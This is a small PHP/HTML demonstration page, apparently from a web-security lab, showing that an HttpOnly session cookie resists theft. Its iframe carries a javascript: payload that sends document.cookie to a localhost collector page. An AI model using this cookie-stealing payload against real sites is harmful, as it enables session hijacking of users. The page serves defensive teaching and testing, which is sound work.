<html>
<?php setcookie('value', 'secret_cookie', "", "", "localhost", false, true); ?>
<head>
<title>Defense : Session Cookie HttpOnly</title>
</head>
<body>
<iframe src="javascript:document.location='http://localhost:8089/bad_session_httponly.php?cookie='+document.cookie"></iframe>
</body>
</html>